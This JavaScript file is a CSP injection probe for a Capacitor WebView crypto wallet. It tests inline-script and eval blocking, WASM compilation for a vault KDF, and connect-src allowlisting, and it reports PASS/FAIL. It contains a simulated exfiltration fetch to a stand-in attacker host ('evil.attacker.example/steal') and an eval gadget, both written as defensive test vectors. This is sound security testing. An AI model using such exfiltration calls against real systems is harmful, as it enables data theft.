/* global window, document, location */
// This probe runs in a browser/WebView, but lives under scripts/** which the
// eslint flat config scopes to Node globals — declare the browser globals it uses.
// LIVE CSP injection probe logic (external 'self' script — inline is blocked by
// the policy, which is the point). Runs concrete vectors against the enforced
// (intersected) CSP and reports PASS/FAIL both on-screen and to the console.
//
// PASS = the policy behaved safely / as the app needs. FAIL = a real problem:
// either an attack vector executed (CSP not enforced) or a legitimate audited
// host is blocked by the duplicate-meta intersection (functionality broken).
(function () {
  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => {
    violations.push({ directive: e.effectiveDirective, blocked: e.blockedURI });
  });

  // Self-bootstrap the UI when injected into a page that has no probe markup
  // (e.g. appended to the real app's index.html to test the SHIPPED policy).
  if (!document.getElementById('results')) {
    const wrap = document.createElement('div');
    wrap.style.cssText = 'position:fixed;inset:0;z-index:2147483647;overflow:auto;background:#050608;color:#e6e6e6;font:13px monospace;padding:12px';
    wrap.innerHTML =
      '<h1 style="font-size:15px">CSP injection probe — capacitor:// WKWebView</h1>' +
      '<div id="origin"></div>' +
      '<table id="results" style="border-collapse:collapse;width:100%;margin-top:8px"><thead><tr>' +
      '<th style="border:1px solid #333;padding:5px;text-align:left">#</th>' +
      '<th style="border:1px solid #333;padding:5px;text-align:left">Vector</th>' +
      '<th style="border:1px solid #333;padding:5px;text-align:left">Expected</th>' +
      '<th style="border:1px solid #333;padding:5px;text-align:left">Result</th>' +
      '</tr></thead><tbody></tbody></table>';
    (document.body || document.documentElement).appendChild(wrap);
    const css = document.createElement('style');
    css.textContent = '#results td{border:1px solid #333;padding:5px;vertical-align:top}.PASS{color:#34d399;font-weight:700}.FAIL{color:#f87171;font-weight:700}.expect{color:#888}';
    document.head.appendChild(css);
  }
  const rows = [];
  const tbody = document.querySelector('#results tbody');
  function record(vector, expected, ok, detail) {
    rows.push({ vector, expected, result: ok ? 'PASS' : 'FAIL', detail });
    const tr = document.createElement('tr');
    // Build cells with textContent — the labels contain literal "<script>" which
    // innerHTML would parse as a tag and swallow the rest of the row.
    const cells = [
      ['', String(rows.length)],
      ['', vector],
      ['expect', expected],
      [ok ? 'PASS' : 'FAIL', `${ok ? 'PASS' : 'FAIL'} — ${detail}`],
    ];
    for (const [cls, text] of cells) {
      const td = document.createElement('td');
      if (cls) td.className = cls;
      td.textContent = text;
      tr.appendChild(td);
    }
    tbody.appendChild(tr);
  }

  document.getElementById('origin').textContent = 'origin: ' + location.origin;

  // VECTOR 1 — inline-script execution (set in the HTML). CSP without
  // 'unsafe-inline' must block it: __inlineRan should be undefined.
  record(
    'Inline <script> execution',
    'blocked (CSP enforced)',
    window.__inlineRan !== true,
    window.__inlineRan === true ? 'INLINE SCRIPT RAN — CSP NOT enforced!' : 'inline script blocked',
  );

  // VECTOR 2 — eval(). script-src has no 'unsafe-eval' → must throw EvalError.
  let evalBlocked = false;
  try { (0, eval)('window.__evalRan = true'); } catch (_) { evalBlocked = true; }
  record(
    "eval() gadget",
    'blocked (no unsafe-eval)',
    evalBlocked && window.__evalRan !== true,
    evalBlocked ? 'eval threw (blocked)' : 'eval EXECUTED — script policy weak!',
  );

  // VECTOR 3 — exfiltration to a non-allowlisted host. connect-src must block it.
  // A CSP block surfaces as a TypeError on fetch + a securitypolicyviolation.
  async function probeConnect(url, label, expectBlocked, expectedText) {
    let cspBlocked = false;
    try {
      await fetch(url, { method: 'GET', mode: 'no-cors' });
    } catch (_) {
      cspBlocked = true; // network OR csp — disambiguated by the violation event below
    }
    // Give the violation event a tick to fire.
    await new Promise((r) => setTimeout(r, 50));
    const viol = violations.find((v) => v.directive === 'connect-src' && (v.blocked || '').includes(new URL(url).host));
    const wasCspBlocked = !!viol;
    const ok = expectBlocked ? wasCspBlocked : !wasCspBlocked;
    record(
      label,
      expectedText,
      ok,
      wasCspBlocked ? 'CSP-blocked' : cspBlocked ? 'network-failed (NOT csp)' : 'reached (not csp-blocked)',
    );
  }

  (async () => {
    // VECTOR W — WebAssembly compilation under CSP (#227 / #230 / #234).
    // The vault KDF (Argon2id via hash-wasm) and PR #230's decoy/hidden/panic
    // crypto compile a WASM module. script-src 'wasm-unsafe-eval' must permit it
    // — otherwise WebAssembly.compile() throws and the wallet can never unlock.
    // This is the "vault-unlock-under-CSP" check PR #227's commit flagged.
    // Bytes = the 8-byte empty-module header (magic + version) — a valid module.
    let wasmOk = false, wasmErr = '';
    try {
      await WebAssembly.compile(new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]));
      wasmOk = true;
    } catch (e) { wasmErr = String(e && e.message || e); }
    record(
      'WASM compile (Argon2id KDF)',
      'allowed (wasm-unsafe-eval)',
      wasmOk,
      wasmOk ? 'WebAssembly.compile succeeded — vault KDF works under CSP' : 'BLOCKED — vault cannot unlock: ' + wasmErr,
    );

    // 3a: attacker exfil endpoint — MUST be CSP-blocked.
    await probeConnect('https://evil.attacker.example/steal', 'Exfil to evil.attacker.example', true, 'blocked (anti-exfil)');
    // 3b: off-allowlist name service (api.ensideas.com) — ENS resolves on-chain
    //     via the RPC nodes and SNS is honest-disabled, so no third-party name
    //     host is allowlisted. This MUST be CSP-blocked (least privilege).
    await probeConnect('https://api.ensideas.com/ens/resolve/vitalik.eth', 'Off-allowlist name service (ensideas)', true, 'blocked (ENS on-chain, not allowlisted)');
    // 3c: price API (min-api.cryptocompare.com) — in BOTH policies, must be reachable.
    await probeConnect('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD', 'Price API (cryptocompare)', false, 'reachable (core feature)');

    const summary = {
      origin: location.origin,
      cspEnforced: window.__inlineRan !== true && evalBlocked,
      kdfWorksUnderCsp: wasmOk, // wasm-unsafe-eval effective → vault unlock OK (#230 crypto)
      vectors: rows,
      violations,
    };
    // Single structured line — readable headlessly via `simctl spawn log` filter.
    console.log('CSP_PROBE_RESULT ' + JSON.stringify(summary));
    const done = document.createElement('div');
    done.id = 'probe-done';
    done.textContent = 'probe complete';
    document.body.appendChild(done);
  })();
})();
